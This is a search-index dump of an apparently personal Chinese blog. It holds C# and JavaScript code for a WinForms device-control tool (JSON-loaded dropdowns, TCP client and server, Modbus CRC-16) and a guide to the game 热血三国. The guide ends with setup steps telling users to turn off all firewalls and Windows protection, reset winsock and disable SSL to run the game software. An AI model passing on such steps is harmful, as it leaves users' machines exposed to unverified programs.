[{"content":"初始化数据 Newtonsoft.Json\n//config.json { \u0026#34;Lu1Items\u0026#34;: [ { \u0026#34;ID\u0026#34;: 1, \u0026#34;Name\u0026#34;: \u0026#34;1路\u0026#34; }, { \u0026#34;ID\u0026#34;: 2, \u0026#34;Name\u0026#34;: \u0026#34;2路\u0026#34; }, { \u0026#34;ID\u0026#34;: 3, \u0026#34;Name\u0026#34;: \u0026#34;3路\u0026#34; }, { \u0026#34;ID\u0026#34;: 4, \u0026#34;Name\u0026#34;: \u0026#34;4路\u0026#34; }, { \u0026#34;ID\u0026#34;: 5, \u0026#34;Name\u0026#34;: \u0026#34;5路\u0026#34; }, { \u0026#34;ID\u0026#34;: 6, \u0026#34;Name\u0026#34;: \u0026#34;6路\u0026#34; }, { \u0026#34;ID\u0026#34;: 7, \u0026#34;Name\u0026#34;: \u0026#34;7路\u0026#34; }, { \u0026#34;ID\u0026#34;: 8, \u0026#34;Name\u0026#34;: \u0026#34;8路\u0026#34; } ], \u0026#34;Value1Items\u0026#34;: [ { \u0026#34;ID\u0026#34;: 0, \u0026#34;Name\u0026#34;: \u0026#34;0V\u0026#34; }, { \u0026#34;ID\u0026#34;: 5, \u0026#34;Name\u0026#34;: \u0026#34;5V\u0026#34; }, { \u0026#34;ID\u0026#34;: 10, \u0026#34;Name\u0026#34;: \u0026#34;10V\u0026#34; } ] } 数据处理 using System; using System.Collections.Generic; using System.IO; using System.Windows.Forms; using Newtonsoft.Json; namespace ComboBoxJsonLoader { /// \u0026lt;summary\u0026gt; /// 带ID的下拉列表项模型 /// \u0026lt;/summary\u0026gt; public class ComboBoxItem { [JsonProperty(\u0026#34;ID\u0026#34;)] public int ID { get; set; } [JsonProperty(\u0026#34;Name\u0026#34;)] public string Name { get; set; } /// \u0026lt;summary\u0026gt; /// 重写ToString方法，使ComboBox显示Name属性 /// \u0026lt;/summary\u0026gt; /// \u0026lt;returns\u0026gt;\u0026lt;/returns\u0026gt; public override string ToString() { return Name; } } /// \u0026lt;summary\u0026gt; /// 包含两个下拉列表数据的模型 /// \u0026lt;/summary\u0026gt; public class ComboBoxData { [JsonProperty(\u0026#34;Level1Items\u0026#34;)] public List\u0026lt;ComboBoxItem\u0026gt; Level1Items { get; set; } [JsonProperty(\u0026#34;Value1Items\u0026#34;)] public List\u0026lt;ComboBoxItem\u0026gt; Value1Items { get; set; } } /// \u0026lt;summary\u0026gt; /// JSON数据加载器，负责从文件读取数据并填充到ComboBox /// \u0026lt;/summary\u0026gt; public class JsonDataLoader { /// \u0026lt;summary\u0026gt; /// 从JSON文件加载带ID的数据并填充到ComboBox /// \u0026lt;/summary\u0026gt; /// \u0026lt;param name=\u0026#34;jsonFilePath\u0026#34;\u0026gt;JSON文件路径\u0026lt;/param\u0026gt; /// \u0026lt;param name=\u0026#34;comboBoxL1\u0026#34;\u0026gt;第一个ComboBox控件\u0026lt;/param\u0026gt; /// \u0026lt;param name=\u0026#34;comboBoxV1\u0026#34;\u0026gt;第二个ComboBox控件\u0026lt;/param\u0026gt; public void LoadDataToComboBoxes(string jsonFilePath, ComboBox comboBoxL1, ComboBox comboBoxV1) { try { // 检查文件是否存在 if (!File.Exists(jsonFilePath)) { MessageBox.Show($\u0026#34;文件不存在: {jsonFilePath}\u0026#34;, \u0026#34;错误\u0026#34;, MessageBoxButtons.OK, MessageBoxIcon.Error); return; } // 读取JSON文件内容 string jsonContent = File.ReadAllText(jsonFilePath); // 反序列化为对象 ComboBoxData data = JsonConvert.DeserializeObject\u0026lt;ComboBoxData\u0026gt;(jsonContent); // 检查反序列化结果 if (data == null) { MessageBox.Show(\u0026#34;无法解析JSON数据\u0026#34;, \u0026#34;错误\u0026#34;, MessageBoxButtons.OK, MessageBoxIcon.Error); return; } // 填充第一个ComboBox if (data.Level1Items != null \u0026amp;\u0026amp; data.Level1Items.Count \u0026gt; 0) { comboBoxL1.DataSource = data.Level1Items; comboBoxL1.DisplayMember = \u0026#34;Name\u0026#34;; comboBoxL1.ValueMember = \u0026#34;ID\u0026#34;; } else { MessageBox.Show(\u0026#34;Level1Items数据为空或不存在\u0026#34;, \u0026#34;警告\u0026#34;, MessageBoxButtons.OK, MessageBoxIcon.Warning); } // 填充第二个ComboBox if (data.Value1Items != null \u0026amp;\u0026amp; data.Value1Items.Count \u0026gt; 0) { comboBoxV1.DataSource = data.Value1Items; comboBoxV1.DisplayMember = \u0026#34;Name\u0026#34;; comboBoxV1.ValueMember = \u0026#34;ID\u0026#34;; } else { MessageBox.Show(\u0026#34;Value1Items数据为空或不存在\u0026#34;, \u0026#34;警告\u0026#34;, MessageBoxButtons.OK, MessageBoxIcon.Warning); } } catch (Exception ex) { MessageBox.Show($\u0026#34;加载数据时出错: {ex.Message}\u0026#34;, \u0026#34;错误\u0026#34;, MessageBoxButtons.OK, MessageBoxIcon.Error); } } } } //Designer.cs namespace ColorCWinFormsApp1 { partial class Form1 { /// \u0026lt;summary\u0026gt; /// 必需的设计器变量。 /// \u0026lt;/summary\u0026gt; private System.ComponentModel.IContainer components = null; /// \u0026lt;summary\u0026gt; /// 清理所有正在使用的资源。 /// \u0026lt;/summary\u0026gt; /// \u0026lt;param name=\u0026#34;disposing\u0026#34;\u0026gt;如果应释放托管资源，为 true；否则为 false。\u0026lt;/param\u0026gt; protected override void Dispose(bool disposing) { if (disposing \u0026amp;\u0026amp; (components != null)) { components.Dispose(); } base.Dispose(disposing); } #region Windows 窗体设计器生成的代码 /// \u0026lt;summary\u0026gt; /// 设计器支持所需的方法 - 不要修改 /// 使用代码编辑器修改此方法的内容。 /// \u0026lt;/summary\u0026gt; private void InitializeComponent() { comboBoxL1 = new ComboBox(); comboBoxV1 = new ComboBox(); label1 = new Label(); label2 = new Label(); statusStrip1 = new StatusStrip(); toolStripStatusLabel1 = new ToolStripStatusLabel(); toolStripStatusLabel2 = new ToolStripStatusLabel(); toolStrip1 = new ToolStrip(); toolStripButtonRefresh = new ToolStripButton(); statusStrip1.SuspendLayout(); toolStrip1.SuspendLayout(); SuspendLayout(); // // comboBoxL1 // comboBoxL1.DropDownStyle = ComboBoxStyle.DropDownList; comboBoxL1.FormattingEnabled = true; comboBoxL1.Location = new Point(12, 43); comboBoxL1.Name = \u0026#34;comboBoxL1\u0026#34;; comboBoxL1.Size = new Size(250, 25); comboBoxL1.TabIndex = 0; // // comboBoxV1 // comboBoxV1.DropDownStyle = ComboBoxStyle.DropDownList; comboBoxV1.FormattingEnabled = true; comboBoxV1.Location = new Point(12, 111); comboBoxV1.Name = \u0026#34;comboBoxV1\u0026#34;; comboBoxV1.Size = new Size(250, 25); comboBoxV1.TabIndex = 1; // // label1 // label1.AutoSize = true; label1.Location = new Point(12, 23); label1.Name = \u0026#34;label1\u0026#34;; label1.Size = new Size(39, 17); label1.TabIndex = 2; label1.Text = \u0026#34;路数 :\u0026#34;; // // label2 // label2.AutoSize = true; label2.Location = new Point(12, 91); label2.Name = \u0026#34;label2\u0026#34;; label2.Size = new Size(39, 17); label2.TabIndex = 3; label2.Text = \u0026#34;电压 :\u0026#34;; // // statusStrip1 // statusStrip1.Items.AddRange(new ToolStripItem[] { toolStripStatusLabel1, toolStripStatusLabel2 }); statusStrip1.Location = new Point(0, 438); statusStrip1.Name = \u0026#34;statusStrip1\u0026#34;; statusStrip1.Size = new Size(606, 22); statusStrip1.TabIndex = 4; statusStrip1.Text = \u0026#34;statusStrip1\u0026#34;; // // toolStripStatusLabel1 // toolStripStatusLabel1.Name = \u0026#34;toolStripStatusLabel1\u0026#34;; toolStripStatusLabel1.Size = new Size(131, 17); toolStripStatusLabel1.Text = \u0026#34;toolStripStatusLabel1\u0026#34;; // // toolStripStatusLabel2 // toolStripStatusLabel2.Name = \u0026#34;toolStripStatusLabel2\u0026#34;; toolStripStatusLabel2.Size = new Size(131, 17); toolStripStatusLabel2.Text = \u0026#34;toolStripStatusLabel2\u0026#34;; // // toolStrip1 // toolStrip1.Items.AddRange(new ToolStripItem[] { toolStripButtonRefresh }); toolStrip1.Location = new Point(0, 0); toolStrip1.Name = \u0026#34;toolStrip1\u0026#34;; toolStrip1.Size = new Size(606, 25); toolStrip1.TabIndex = 5; toolStrip1.Text = \u0026#34;toolStrip1\u0026#34;; // // toolStripButtonRefresh // toolStripButtonRefresh.DisplayStyle = ToolStripItemDisplayStyle.Text; toolStripButtonRefresh.ImageTransparentColor = Color.Magenta; toolStripButtonRefresh.Name = \u0026#34;toolStripButtonRefresh\u0026#34;; toolStripButtonRefresh.Size = new Size(36, 22); toolStripButtonRefresh.Text = \u0026#34;刷新\u0026#34;; toolStripButtonRefresh.Click += toolStripButtonRefresh_Click; // // Form1 // AutoScaleDimensions = new SizeF(7F, 17F); AutoScaleMode = AutoScaleMode.Font; ClientSize = new Size(606, 460); Controls.Add(toolStrip1); Controls.Add(statusStrip1); Controls.Add(label2); Controls.Add(label1); Controls.Add(comboBoxV1); Controls.Add(comboBoxL1); Name = \u0026#34;Form1\u0026#34;; Text = \u0026#34;Color\u0026#34;; statusStrip1.ResumeLayout(false); statusStrip1.PerformLayout(); toolStrip1.ResumeLayout(false); toolStrip1.PerformLayout(); ResumeLayout(false); PerformLayout(); } #endregion private System.Windows.Forms.ComboBox comboBoxL1; private System.Windows.Forms.ComboBox comboBoxV1; private System.Windows.Forms.Label label1; private System.Windows.Forms.Label label2; private System.Windows.Forms.StatusStrip statusStrip1; private System.Windows.Forms.ToolStripStatusLabel toolStripStatusLabel1; private System.Windows.Forms.ToolStripStatusLabel toolStripStatusLabel2; private System.Windows.Forms.ToolStrip toolStrip1; private System.Windows.Forms.ToolStripButton toolStripButtonRefresh; } } //Form1.cs namespace ColorCWinFormsApp1 { public partial class Form1 : Form { // 数据加载器实例 private readonly JsonDataLoader _dataLoader; // JSON文件路径 private const string JsonFilePath = \u0026#34;ColorConifg.json\u0026#34;; public Form1() { InitializeComponent(); _dataLoader = new JsonDataLoader(); // 注册事件 Load += Form1_Load; comboBoxL1.SelectedIndexChanged += ComboBoxL1_SelectedIndexChanged; comboBoxV1.SelectedIndexChanged += ComboBoxV1_SelectedIndexChanged; } private void Form1_Load(object sender, EventArgs e) { // 加载数据到ComboBox LoadComboBoxData(); } /// \u0026lt;summary\u0026gt; /// 从JSON文件加载数据到ComboBox /// \u0026lt;/summary\u0026gt; private void LoadComboBoxData() { try { _dataLoader.LoadDataToComboBoxes(JsonFilePath, comboBoxL1, comboBoxV1); // 如果有数据，默认选中第一项 if (comboBoxL1.Items.Count \u0026gt; 0) comboBoxL1.SelectedIndex = 0; if (comboBoxV1.Items.Count \u0026gt; 0) comboBoxV1.SelectedIndex = 0; } catch (Exception ex) { MessageBox.Show($\u0026#34;加载数据失败: {ex.Message}\u0026#34;, \u0026#34;错误\u0026#34;, MessageBoxButtons.OK, MessageBoxIcon.Error); } } /// \u0026lt;summary\u0026gt; /// 第一个ComboBox选中项变化事件 /// \u0026lt;/summary\u0026gt; private void ComboBoxL1_SelectedIndexChanged(object sender, EventArgs e) { if (comboBoxL1.SelectedItem is ComboBoxItem selectedItem) { // 显示选中项的信息 toolStripStatusLabel1.Text = $\u0026#34;选中的路数: {selectedItem.Name} (ID: {selectedItem.ID})\u0026#34;; } } /// \u0026lt;summary\u0026gt; /// 第二个ComboBox选中项变化事件 /// \u0026lt;/summary\u0026gt; private void ComboBoxV1_SelectedIndexChanged(object sender, EventArgs e) { if (comboBoxV1.SelectedItem is ComboBoxItem selectedItem) { // 显示选中项的信息 toolStripStatusLabel2.Text = $\u0026#34;选中的电压: {selectedItem.Name} (ID: {selectedItem.ID})\u0026#34;; } } } 可以通过comboBoxL1.SelectedValue直接获取选中项的 ID 可以通过comboBoxL1.SelectedItem获取完整的选项对象\nTCP服务器测试 - 可选 using System; using System.Net; using System.Net.Sockets; using System.Text; using System.Threading.Tasks; using System.Windows.Forms; namespace TcpServerExample { public partial class MainForm : Form { private TcpListener server; private bool isServerRunning = false; public MainForm() { InitializeComponent(); // 初始化UI InitializeUI(); } private void InitializeUI() { // 设置窗体标题 this.Text = \u0026#34;TCP服务器\u0026#34;; this.Size = new System.Drawing.Size(600, 400); // 创建日志文本框 txtLog = new TextBox(); txtLog.Multiline = true; txtLog.ScrollBars = ScrollBars.Vertical; txtLog.Dock = DockStyle.Fill; txtLog.ReadOnly = true; // 创建按钮 buttonTestSer = new Button(); buttonTestSer.Text = \u0026#34;启动TCP服务器\u0026#34;; buttonTestSer.Dock = DockStyle.Top; buttonTestSer.Height = 40; buttonTestSer.Click += buttonTestSer_Click; // 创建端口输入框 txtPort = new TextBox(); txtPort.Dock = DockStyle.Top; txtPort.Text = \u0026#34;8888\u0026#34;; txtPort.Height = 30; txtPort.PlaceholderText = \u0026#34;输入端口号\u0026#34;; // 添加控件到窗体 this.Controls.Add(txtLog); this.Controls.Add(buttonTestSer); this.Controls.Add(txtPort); // 注册窗体关闭事件 this.FormClosing += MainForm_FormClosing; } private void buttonTestSer_Click(object sender, EventArgs e) { if (!isServerRunning) { // 启动服务器 if (int.TryParse(txtPort.Text, out int port) \u0026amp;\u0026amp; port \u0026gt; 0 \u0026amp;\u0026amp; port \u0026lt;= 65535) { Task.Run(() =\u0026gt; StartTcpServer(port)); buttonTestSer.Text = \u0026#34;停止TCP服务器\u0026#34;; } else { MessageBox.Show(\u0026#34;请输入有效的端口号（1-65535）\u0026#34;, \u0026#34;输入错误\u0026#34;, MessageBoxButtons.OK, MessageBoxIcon.Error); } } else { // 停止服务器 StopTcpServer(); buttonTestSer.Text = \u0026#34;启动TCP服务器\u0026#34;; } } private void StartTcpServer(int port) { try { // 初始化TCP监听器 server = new TcpListener(IPAddress.Any, port); server.Start(); isServerRunning = true; UpdateStatus($\u0026#34;服务器已启动，监听端口: {port}\u0026#34;); // 循环接受客户端连接 while (isServerRunning) { // 等待客户端连接 TcpClient client = server.AcceptTcpClient(); UpdateStatus(\u0026#34;客户端已连接\u0026#34;); // 处理客户端通信（使用新线程避免阻塞接受其他连接） Task.Run(() =\u0026gt; HandleClient(client)); } } catch (Exception ex) { if (isServerRunning) // 只有在服务器应该运行时才显示错误 { UpdateStatus($\u0026#34;服务器错误: {ex.Message}\u0026#34;); } } } private void StopTcpServer() { isServerRunning = false; server?.Stop(); UpdateStatus(\u0026#34;服务器已停止\u0026#34;); } private void HandleClient(TcpClient client) { try { // 获取网络流 using (NetworkStream stream = client.GetStream()) { byte[] buffer = new byte[1024]; int bytesRead; // 读取客户端发送的数据 while ((bytesRead = stream.Read(buffer, 0, buffer.Length)) != 0) { // 转换为字符串 string clientMessage = Encoding.UTF8.GetString(buffer, 0, bytesRead); UpdateStatus($\u0026#34;收到消息: {clientMessage}\u0026#34;); // 追加OK并转换为字节数组 string response = $\u0026#34;{clientMessage}OK\u0026#34;; byte[] responseBytes = Encoding.UTF8.GetBytes(response); // 发送回复 stream.Write(responseBytes, 0, responseBytes.Length); UpdateStatus($\u0026#34;已回复: {response}\u0026#34;); } } UpdateStatus(\u0026#34;客户端已断开连接\u0026#34;); } catch (Exception ex) { UpdateStatus($\u0026#34;客户端处理错误: {ex.Message}\u0026#34;); } finally { // 关闭客户端连接 client.Close(); } } // 更新状态显示（跨线程安全） private void UpdateStatus(string message) { if (InvokeRequired) { Invoke(new Action\u0026lt;string\u0026gt;(UpdateStatus), message); return; } // 显示日志信息 txtLog.AppendText($\u0026#34;{DateTime.Now:HH:mm:ss} {message}\\r\\n\u0026#34;); txtLog.ScrollToCaret(); } // 窗体关闭时停止服务器 private void MainForm_FormClosing(object sender, FormClosingEventArgs e) { StopTcpServer(); } #region 自动生成的控件定义 private TextBox txtLog; private Button buttonTestSer; private TextBox txtPort; #endregion } } 运行\nXX:52:09 服务器已启动，监听端口: 8881\n连接串口服务器 private async void buttonCon1_Click(object sender, EventArgs e) { string ip1 = textBoxIP1.Text; string port1 = textBoxPort1.Text; //MessageBox.Show(ip1 + \u0026#34;:\u0026#34;+port1); // 验证输入 if (string.IsNullOrWhiteSpace(ip1) || string.IsNullOrWhiteSpace(port1)) { MessageBox.Show(\u0026#34;请输入IP地址和端口号\u0026#34;, \u0026#34;输入错误\u0026#34;, MessageBoxButtons.OK, MessageBoxIcon.Error); return; } if (!int.TryParse(port1, out int port) || port \u0026lt; 1 || port \u0026gt; 65535) { MessageBox.Show(\u0026#34;请输入有效的端口号(1-65535)\u0026#34;, \u0026#34;输入错误\u0026#34;, MessageBoxButtons.OK, MessageBoxIcon.Error); return; } try { // 创建TCP客户端并连接服务器 using (TcpClient client = new TcpClient()) { // 异步连接，避免UI卡顿 await client.ConnectAsync(ip1, port); MessageBox.Show($\u0026#34;已成功连接到 {ip1}:{port}\u0026#34;, \u0026#34;连接成功\u0026#34;, MessageBoxButtons.OK, MessageBoxIcon.Information); // 准备要发送的消息 string message = \u0026#34;Hello from client!\u0026#34;; byte[] data = System.Text.Encoding.UTF8.GetBytes(message); // 获取网络流并发送数据 using (NetworkStream stream = client.GetStream()) { await stream.WriteAsync(data, 0, data.Length); MessageBox.Show($\u0026#34;已发送消息: {message}\u0026#34;, \u0026#34;发送成功\u0026#34;, MessageBoxButtons.OK, MessageBoxIcon.Information); } // 发送完成后关闭连接 client.Close(); } } catch (Exception ex) { MessageBox.Show($\u0026#34;连接或发送失败: {ex.Message}\u0026#34;, \u0026#34;错误\u0026#34;, MessageBoxButtons.OK, MessageBoxIcon.Error); } } 优化 发送消息与线程安全 private TcpClient client; private NetworkStream stream; private async void buttonCon1_Click(object sender, EventArgs e) { string ip1 = textBoxIP1.Text; string port1 = textBoxPort1.Text; //MessageBox.Show(ip1 + \u0026#34;:\u0026#34;+port1); // 验证输入 if (string.IsNullOrWhiteSpace(ip1) || string.IsNullOrWhiteSpace(port1)) { MessageBox.Show(\u0026#34;请输入IP地址和端口号\u0026#34;, \u0026#34;输入错误\u0026#34;, MessageBoxButtons.OK, MessageBoxIcon.Error); return; } if (!int.TryParse(port1, out int port) || port \u0026lt; 1 || port \u0026gt; 65535) { MessageBox.Show(\u0026#34;请输入有效的端口号(1-65535)\u0026#34;, \u0026#34;输入错误\u0026#34;, MessageBoxButtons.OK, MessageBoxIcon.Error); return; } try { client = new TcpClient(); // 异步连接，避免UI卡顿 await client.ConnectAsync(ip1, port); MessageBox.Show($\u0026#34;已成功连接到 {ip1}:{port}\u0026#34;, \u0026#34;连接成功\u0026#34;, MessageBoxButtons.OK, MessageBoxIcon.Information); } catch (Exception ex) { MessageBox.Show($\u0026#34;连接或发送失败: {ex.Message}\u0026#34;, \u0026#34;错误\u0026#34;, MessageBoxButtons.OK, MessageBoxIcon.Error); } } public async void SendMsg1(string str) { if (client == null || !client.Connected) { UpdateStatus(\u0026#34;未连接到服务器，请先建立连接\u0026#34;); return; } string message = str; try { // 不要使用 using，保持流的持续打开 if (stream == null) stream = client.GetStream(); // 发送消息 byte[] sendData = System.Text.Encoding.UTF8.GetBytes(message); await stream.WriteAsync(sendData, 0, sendData.Length); UpdateStatus($\u0026#34;已发送: {message}\u0026#34;); // 接收服务器响应 byte[] receiveBuffer = new byte[1024]; int bytesRead = await stream.ReadAsync(receiveBuffer, 0, receiveBuffer.Length); string response = System.Text.Encoding.UTF8.GetString(receiveBuffer, 0, bytesRead); UpdateStatus($\u0026#34;收到响应: {response}\u0026#34;); } catch (Exception ex) { UpdateStatus($\u0026#34;发送失败: {ex.Message}\u0026#34;); } } // 建议添加一个专门的关闭连接方法 private void CloseConnection() { if (stream != null) { stream.Dispose(); stream = null; } if (client != null) { client.Close(); client = null; UpdateStatus(\u0026#34;连接已关闭\u0026#34;); } } // 更新状态显示（跨线程安全） public async void UpdateStatus(string message) { if (InvokeRequired) { Invoke(new Action\u0026lt;string\u0026gt;(UpdateStatus), message); return; } // 显示日志信息 textBoxLog.AppendText($\u0026#34;{DateTime.Now:HH:mm:ss} {message}\\r\\n\u0026#34;); textBoxLog.ScrollToCaret(); } CRC-16-MODBUS计算 public static string CalculateModbusCRC16(string hexString) { // 去除字符串中的空格 hexString = hexString.Replace(\u0026#34; \u0026#34;, \u0026#34;\u0026#34;); // 验证输入的16进制字符串是否合法 if (hexString.Length % 2 != 0) { throw new ArgumentException(\u0026#34;Invalid hex string length\u0026#34;); } // 将16进制字符串转换为字节数组 byte[] byteArray = new byte[hexString.Length / 2]; for (int i = 0; i \u0026lt; hexString.Length; i += 2) { byteArray[i / 2] = Convert.ToByte(hexString.Substring(i, 2), 16); } // 初始化CRC值 ushort crc = 0xFFFF; // CRC初始值为0xFFFF // CRC16算法 foreach (byte b in byteArray) { crc ^= b; // 对当前字节和CRC值进行异或操作 for (int j = 0; j \u0026lt; 8; j++) // 遍历每一个比特位 { if ((crc \u0026amp; 0x0001) != 0) // 检查最低位是否为1 { crc = (ushort)((crc \u0026gt;\u0026gt; 1) ^ 0xA001); // 如果是1，右移并进行多项式异或 } else { crc \u0026gt;\u0026gt;= 1; // 如果不是1，只右移 } } } // 返回CRC值，低字节和高字节(小端字节序) byte lowByte = (byte)(crc \u0026amp; 0xFF); byte highByte = (byte)((crc \u0026gt;\u0026gt; 8) \u0026amp; 0xFF); return $\u0026#34;{lowByte:X2}{highByte:X2}\u0026#34;; } // 使用示例 string crc = CalculateModbusCRC16(\u0026#34;0106000B2710\u0026#34;); Console.WriteLine(crc); CRC16(hexString) { // 去除字符串中的空格 hexString = hexString.replace(/\\s+/g, \u0026#39;\u0026#39;); // 验证输入的16进制字符串是否合法 if (hexString.length % 2 !== 0) { throw new Error(\u0026#34;Invalid hex string length\u0026#34;); } // 将16进制字符串转换为字节数组 const byteArray = []; for (let i = 0; i \u0026lt; hexString.length; i += 2) { const byte = parseInt(hexString.substr(i, 2), 16); byteArray.push(byte); } // 初始化CRC值 let crc = 0xFFFF; // CRC初始值为0xFFFF // CRC16算法 for (let i = 0; i \u0026lt; byteArray.length; i++) { crc ^= byteArray[i]; // 对当前字节和CRC值进行异或操作 for (let j = 0; j \u0026lt; 8; j++) { // 遍历每一个比特位 if (crc \u0026amp; 0x0001) { // 检查最低位是否为1 crc = (crc \u0026gt;\u0026gt; 1) ^ 0xA001; // 如果是1，右移并进行多项式异或 } else { crc \u0026gt;\u0026gt;= 1; // 如果不是1，只右移 } } } // 返回CRC值 //return ((crc \u0026gt;\u0026gt; 8) \u0026amp; 0xFF).toString(16).padStart(2, \u0026#39;0\u0026#39;) + (crc \u0026amp; 0xFF).toString(16).padStart(2, \u0026#39;0\u0026#39;); // 返回CRC值，低字节和高字节(小端字节序) return (crc \u0026amp; 0xFF).toString(16).padStart(2, \u0026#39;0\u0026#39;).toUpperCase() + ((crc \u0026gt;\u0026gt; 8) \u0026amp; 0xFF).toString(16).padStart(2, \u0026#39;0\u0026#39;).toUpperCase(); } // 获取输入的16进制字符串（假设msg.payload是输入的16进制字符串） let hexString = msg.payload; // 计算CRC let crc = calculateModbusCRC16(hexString); msg.payload = msg.payload.replace(/\\s+/g, \u0026#39;\u0026#39;) + crc; // 返回计算后的消息 return msg; //01 10 00 0A 00 02 04 13 88 13 88 0110000A00020413881388 16进制处理 public static string ToCustomHex(int number) { int result = number + 9; return result.ToString(\u0026#34;X4\u0026#34;); // 转为4位十六进制，不足补0 } 参数算法 int nv1 = Convert.ToInt32(sv1); int nl1 = Convert.ToInt32(sl1); string slu1 = ColorCHelper.ToCustomHex(nl1); string svv1 = \u0026#34;\u0026#34;;// ColorCHelper.ToCustomHex(nv1); if (nv1 == 0) { svv1 = \u0026#34;0000\u0026#34;; } else if (nv1 == 5) { svv1 = \u0026#34;1388\u0026#34;; } else if (nv1 == 10) { svv1 = \u0026#34;2710\u0026#34;; } List\u0026lt;string \u0026gt; strlist = new List\u0026lt;string\u0026gt;(); string stemp11 = \u0026#34;\u0026#34;; for (int i = 1; i \u0026lt;=nl1; i++) { //f4 string stemp = \u0026#34;0106\u0026#34;;//设备 string inti1 = ColorCHelper.ToCustomHex(i); stemp = stemp + inti1 + svv1;//4+4+4 string s1 = ColorCHelper.CalculateModbusCRC16(stemp); string srs1 = stemp + s1; strlist.Add(srs1); stemp11 += srs1+\u0026#34;,\u0026#34;; } CRC CheckBox // 清空旧的内容 panelZ.Controls.Clear(); int startY = 10; // 起始 Y 坐标 int spacing = 30; // 每个 CheckBox 的间距 for (int i = 0; i \u0026lt; items.Count; i++) { CheckBox chk = new CheckBox(); chk.Text = items[i]; chk.AutoSize = true; chk.Location = new Point(10, startY + i * spacing); chk.Tag = items[i]; // 可选：存储原始值 // 绑定事件（如果需要） chk.CheckedChanged += (sender, e) =\u0026gt; { var c = sender as CheckBox; Console.WriteLine($\u0026#34;[{c.Text}] 状态: {c.Checked}\u0026#34;); }; // 添加到 panelZ panelZ.Controls.Add(chk); } Next Send\n","permalink":"https://qfsyso.github.io/posts/tcp-color-calibration/","summary":"初始化数据 Newtonsoft.Json\n//config.json { \u0026#34;Lu1Items\u0026#34;: [ { \u0026#34;ID\u0026#34;: 1, \u0026#34;Name\u0026#34;: \u0026#34;1路\u0026#34; }, { \u0026#34;ID\u0026#34;: 2, \u0026#34;Name\u0026#34;: \u0026#34;2路\u0026#34; }, { \u0026#34;ID\u0026#34;: 3, \u0026#34;Name\u0026#34;: \u0026#34;3路\u0026#34; }, { \u0026#34;ID\u0026#34;: 4, \u0026#34;Name\u0026#34;: \u0026#34;4路\u0026#34; }, { \u0026#34;ID\u0026#34;: 5, \u0026#34;Name\u0026#34;: \u0026#34;5路\u0026#34; }, { \u0026#34;ID\u0026#34;: 6, \u0026#34;Name\u0026#34;: \u0026#34;6路\u0026#34; }, { \u0026#34;ID\u0026#34;: 7, \u0026#34;Name\u0026#34;: \u0026#34;7路\u0026#34; }, { \u0026#34;ID\u0026#34;: 8, \u0026#34;Name\u0026#34;: \u0026#34;8路\u0026#34; } ], \u0026#34;Value1Items\u0026#34;: [ { \u0026#34;ID\u0026#34;: 0, \u0026#34;Name\u0026#34;: \u0026#34;0V\u0026#34; }, { \u0026#34;ID\u0026#34;: 5, \u0026#34;Name\u0026#34;: \u0026#34;5V\u0026#34; }, { \u0026#34;ID\u0026#34;: 10, \u0026#34;Name\u0026#34;: \u0026#34;10V\u0026#34; } ] } 数据处理 using System; using System.","title":"TCP Color Calibration"},{"content":"​​一、初期准备与资源管理​​ ​​州城选择​​ ​​避免荒凉州​​：如荆州、益州、交州（资源少、后期攻城条件苛刻）。 ​​推荐州城​​：兖州、豫州（资源丰富），其次幽州、凉州（需选中心地带）。 ​​资源分配​​ ​​建筑优先级​​： 开局造民房→升2级后，城外建农田×2、伐木场×3、采石场×3、铁矿×2。 后续空地全建农田，确保资源稳定。 ​​资源包利用​​：新手卡赠送资源包必领，小号辅助供给（掠夺间隔需≥24小时）。 ​​小号策略​​ 建多个小号加入敌对联盟，迁至主城附近提供资源，加速主城建设。\n​​二、武将选择与培养​​ ​​初期武将​​ ​​输出型优先​​：吕布、赵云等高攻武将，快速形成战力。 ​​内政将必备​​：招募内政≥50的将领任城守，加速建筑升级。 ​​技能与装备​​ 先掌握基础技能，再解锁高级技能。 装备强化顺序：武器＞防具，初期优先升级攻击属性。\n​​三、建筑与科技发展​​ ​​关键建筑​​ ​​客栈升至2级​​：开启招贤馆，刷高属性武将。 ​​军营与校场​​：军营×8（主城）、校场升10级（优化布阵）。 ​​科技研发​​ 优先升级兵种科技（侦查、抛射、驾驶），提升军队实力。\n​​四、战斗与野地攻略​​ ​​初期兵力​​ 速造5000长枪兵占低级野地，再派斥候采集资源。 ​​弓箭兵为核心​​： 5000弓兵可打6级野地，1万可打8级，5万以上挑战12级。 ​​无损战斗技巧​​ ​​炮灰布阵​​：1轻骑（前进）+1斥候（防守）+其余后退，弓箭集火敌方轻骑。 ​​掠夺城池​​：带5000辎重车+数万弓箭，用床弩清驻军避免损耗。\n​​五、常见问题解答​​ ​​Q：如何快速升级？​​ → 完成主线任务+每日签到（连续30天奖励丰厚）+攻打野地。 ​​Q：资源不足怎么办？​​ → 小号供给+掠夺野城（优先侦察资源型城池）。 ​​Q：阵容如何搭配？​​ → 攻防互补（如赵云+防御型武将），根据敌方属性调整克制阵容。\n​​总结关键点​​ ​​核心策略​​：速建资源链→小号辅助→优先弓箭兵→无损刷野积累实力。 ​​避坑提示​​：勿选荒凉州城、勿盲目捐声望（防野地驻军逃跑）。 ​​长期发展​​：加入活跃联盟，参与活动（如“斩妖杀怪”）获取稀有道具。\n三国 名将 http://rxsg173.com/cha.php t200 https://www.xalvluo.com/money.html\n运行 1.程序放D盘 win10 2.关闭各种 防火墙\n3.cmd netsh winsock reset 4.取消ssl\n5.防火墙 apm httpd\n6.关闭win防护\n7.重启 flash\nFlashBrowser_x64_v1.1.0 https://github.com/Mzying2001/CefFlashBrowser/releases/tag/1.1.0 or flash.cn\n","permalink":"https://qfsyso.github.io/posts/rxsg2/","summary":"​​一、初期准备与资源管理​​ ​​州城选择​​ ​​避免荒凉州​​：如荆州、益州、交州（资源少、后期攻城条件苛刻）。 ​​推荐州城​​：兖州、豫州（资源丰富），其次幽州、凉州（需选中心地带）。 ​​资源分配​​ ​​建筑优先级​​： 开局造民房→升2级后，城外建农田×2、伐木场×3、采石场×3、铁矿×2。 后续空地全建农田，确保资源稳定。 ​​资源包利用​​：新手卡赠送资源包必领，小号辅助供给（掠夺间隔需≥24小时）。 ​​小号策略​​ 建多个小号加入敌对联盟，迁至主城附近提供资源，加速主城建设。\n​​二、武将选择与培养​​ ​​初期武将​​ ​​输出型优先​​：吕布、赵云等高攻武将，快速形成战力。 ​​内政将必备​​：招募内政≥50的将领任城守，加速建筑升级。 ​​技能与装备​​ 先掌握基础技能，再解锁高级技能。 装备强化顺序：武器＞防具，初期优先升级攻击属性。\n​​三、建筑与科技发展​​ ​​关键建筑​​ 